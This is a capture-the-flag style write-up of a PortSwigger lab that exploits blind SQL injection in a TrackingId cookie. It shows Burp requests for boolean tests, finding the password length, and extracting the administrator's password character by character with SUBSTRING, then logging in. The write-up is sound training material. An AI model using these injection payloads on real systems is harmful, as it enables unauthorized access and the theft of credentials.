*This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user.*

Upon opening the lab, I clicked on *My account*. I noticed a *Welcome Back* message from the top right of the page, as seen below:
![Screenshot 2024-05-02 at 9.53.21 AM](images/Screenshot%202024-05-02%20at%209.53.21%20AM.png)
I checked my HTTP History in Burp under `GET /login`and searched for the Welcome Back Message, taking note of the Content Length in the response as well: 
```Burp 
Content-Length: 3219
...
<div>Welcome back!</div>
...
```
I sent the same response to Burp Repeater to try and check if the *Welcome Back* message is triggered by a condition. I modified the tracking cookie to add `'AND '1'='1` to see if it returns the conditional message (*Welcome Back*). This is how the modified response looked:
```Burp 
GET /login HTTP/2
Host: 0ab9002a03a2d0018164525b003e00f3.web-security-academy.net
Cookie: TrackingId=duB1G3kGbNknGU88'AND '1'=1; session=op3EfcIch4AIpkkMwsvDRss3ywzzMvQi
...
```
This was the response : 
```Burp 
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3219
...
<div>Welcome back!</div>
```
I modified the response to replace the injected query with `'AND '1'='2`. This was the response: 
```Burp 
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3158
```
![Screenshot 2024-05-02 at 10.03.39 AM](images/Screenshot%202024-05-02%20at%2010.03.39%20AM.png)
As the *Welcome Back* message was triggered by a condition, we can note that this application is vulnerable to blind SQLi. 

Now it's time to find out if there is a username *administrator* and if so, their login credentials. 

Modified the same request to the following: 
```Burp 
GET /login HTTP/2
Host: 0ab9002a03a2d0018164525b003e00f3.web-security-academy.net
Cookie: TrackingId=duB1G3kGbNknGU88'AND (SELECT 'a' FROM users WHERE username='administrator' AND length(password)>1)='a; 
...
```
This returned the *Welcome Back* message : 
```Burp 
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3219
...
<div>Welcome back!</div>
```

Now it's time to find out the length of the password. I sent the request to Burp Intruder and used the *Numbers* payload to include a range from 1 to 30: 

```Burp 
GET /login HTTP/2
Host: 0ab9002a03a2d0018164525b003e00f3.web-security-academy.net
Cookie: TrackingId=duB1G3kGbNknGU88'AND (SELECT 'a' FROM users WHERE username='administrator' AND length(password)>§1§)='a; 
...
```
![Screenshot 2024-05-02 at 10.11.26 AM](images/Screenshot%202024-05-02%20at%2010.11.26%20AM.png)
I also cleared the *Grep Match* list under the Intruder settings and included *Welcome Back* as the value. This was the response: 
![Screenshot 2024-05-02 at 10.13.49 AM](images/Screenshot%202024-05-02%20at%2010.13.49%20AM.png)
As seen from above, the last number that has *Welcome Back* is 20, indicating that the password is 20 characters long. 

Now it's time to find the value of each individual character in the password. 
I first changed the attack type to *Cluster Bomb* and modified the request in Intruder to the following: 
```Burp 
GET /login HTTP/2
Host: 0ab9002a03a2d0018164525b003e00f3.web-security-academy.net
Cookie: TrackingId=duB1G3kGbNknGU88'AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username ='administrator')='§a§; 
...
```
![Screenshot 2024-05-02 at 10.51.05 AM](images/Screenshot%202024-05-02%20at%2010.51.05%20AM.png)

![Screenshot 2024-05-02 at 10.51.39 AM](images/Screenshot%202024-05-02%20at%2010.51.39%20AM.png)
I received the following, filtering the 'Welcome Back' column by those with 1 as a value : 
![Screenshot 2024-05-02 at 12.56.10 PM](images/Screenshot%202024-05-02%20at%2012.56.10%20PM.png)
Checking the values of the character, I pieced together the password to this by sorting payload 1 in ascending order: 
`5qv1dehy1pb8p14uolja`

Logged in with the credentials: 
![Screenshot 2024-05-02 at 1.02.34 PM](images/Screenshot%202024-05-02%20at%201.02.34%20PM.png)
